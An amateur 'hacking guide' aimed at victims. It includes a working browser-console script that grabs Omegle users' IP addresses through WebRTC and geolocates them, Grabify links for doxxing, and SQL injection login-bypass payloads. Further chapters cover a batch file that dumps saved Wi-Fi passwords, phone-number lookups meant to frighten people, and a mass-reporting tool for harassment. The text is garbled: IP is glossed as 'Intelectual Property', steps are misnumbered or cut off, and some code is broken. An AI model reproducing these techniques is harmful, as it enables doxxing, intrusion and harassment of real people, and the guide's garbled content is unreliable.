Hacking Guide 2024 (Deluxe Edition)

Hello, and welcome to the ultimate hacking guide you will ever need! This guide will be updated, and includes many different ways you could get your hands
on the newest ways to hack people, websites, files, systems, etc. Keep in mind that I am NOT responsible for any damages done to anyone or anything
if these techniques are executed. 




Chapter 1: IP Address Grabbing

Description:

An IP, also known as Intelectual Property, is a term used in hacking, and the tech community, which are numbers, including dots in between showing the location
of your device, in a number format. This code can be used for malicious purposes such as DOXXING, DDOSING. More on that later. Some IP addressescan be 
entered into a website or service to show the location of the address on a map, ultimately finding your location. VPNs are "Virtual Private Networks" which hide
your IP address, generating a random IP, masking your actual location, hackers of careful users use VPNs for maximum security.

VPN Recomendations for Hackers, Daily Users:

- Tunnel Bear
- Nord VPN
- Surfshark
- Atlas VPN
- AVG Secure VPN (I use)

=====================================================================================================================================

A few ways to do it:

1. Generating Grabify links, sending it to the victim, trying to manipulate them to click it, knowing there location, DOXX them.

2. Omegle IP Grabbing Script for the omegle site, use a VPN to mask yours.

Detailed Tutorial: 

1. Go on omegle
2. Right click, and select inspect
3. go to console window
4. paste code, start trolling

Script (Java, JS)

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
    const ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
      console.log(output);
    })
  );
};



Chapter 2: Wi-Fi Hijacking

1. Wi-Fi Spoofing
	Making your own unsecure network from laptop with antenna if theres a network with no password
3. Hacking victim with there IP, to trick the computer to use HTTP instead of HTTPS, to have 
	unencrypted data to myself, then send it back to router to not cause irregularities.



Chapter 3: Flipper Zero Hacks

Install, and learn ducky script (in pws) to put to badUSB flipper folder, connect to victims computer, execute the  

Chapter 4: SQL Injections to websites login screens which are unsecure:

Username: admin' OR '1'='1
Password: password123

- if username is correct, the database is SQL for the website login, add OR '1'='1 because the entered strings change
	and this can alter the code to check if 1 = 1, which it is, bypassing the password, and entering the account,
	to do whatever you want with it, only if the website is unsecured, and/or uses old or outdated protocols

- if you do not know the username of the victim, try to bypass the SQL code system database with this trick: 
	in SQL, --  adds a comment, not proccessing anything on that line, after "-- ", which means if the strings updated in the code itself,
	it escapes the code, and ultimately commenting the password section,	

Username: admin'--
Password = dosent_matter_lol


Chapter 5: Phone Number Info

1. Login to google cloud, click the terminal icon to open it.
2. Visit: https://github.com/sundowndev/PhoneInfoga
3. Scroll down to README.md, click "Documentation"
4. Scroll down to Using Docker, and copy this: docker pull sundowndev/PhoneInfoga:latest
5. Paste to Google cloud console, when done, type: "docker run -it sundowndev/phoneinfoga scan -n theirphonenumberwithcountrycodeatstartandalltogether"
6. Look at the exact location, line type, and more info in the shell, enjoy! Scare them with the info you grabbed!
7. GUI - type: docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080, and hit enter
8. Click icon, choose open port 8080, and now the phone info can be viewed in GUI format, and lots more advanced private info, on a web ip to make it easier for the eyes.
9. Thank me and NetworkChuck later!

7. list every wifi, pass, info on a batch file, type:

@echo off
setlocal enabledelaydexpansion

for /F "tokens-2 delims=:" %%a in ('netsh wlan show profile') do (
	set wifi_pwd=
	for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
		set wifi_pwd=%%F
	)

7. intitle:"report" ("qualys" | "acunetix" | "nessus" | "netsparker" | "nmap") filetype:pdf           , and enter to find bank reports, and pdfs for banks


Chapter 16: Autoreporting (Tiktok Videos)

Autoreporting is the practice of sending multiple reports at once, to a certain user, or video. This tutorial is outdated, but can be useful, welcome to Rebomb2
follow the steps to make sure the videos you hate, and should not be on the platform are deleted, from these reports! Newest rebomb2 tut needs win11 for now.

1. Download Rebomb2: https://github.com/Sadyyn/ReBomb2

2. Select "Code" and then "Download ZIP"

10. Paste the URL into your search bar, hit Enter

11. Now, copy the URL again, once on the source page

12. Go back to the video, with inspect element, open "ReBomb2.exe"

13. Once it is running, paste the newest URL into the input box of the program, and wait until "Reported :D" appears, defining how many reports were sent


Chapter17: Grabbing IPS (Local, Public)

1. Go to:   angryip.org
